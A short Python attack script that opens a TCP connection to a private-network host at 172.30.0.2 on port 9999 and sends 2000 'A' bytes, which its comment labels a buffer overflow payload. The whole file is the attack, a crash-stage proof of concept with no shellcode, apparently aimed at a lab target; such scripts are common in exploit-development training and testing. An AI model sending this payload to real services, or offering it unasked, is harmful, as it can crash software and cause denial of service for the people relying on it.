#!/usr/bin/python3
import socket

TARGET_IP = "172.30.0.2"
TARGET_PORT = 9999

payload = b"A" * 2000  # Overflow the buffer

print("[*] Sending buffer overflow payload...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.send(payload)
s.close()
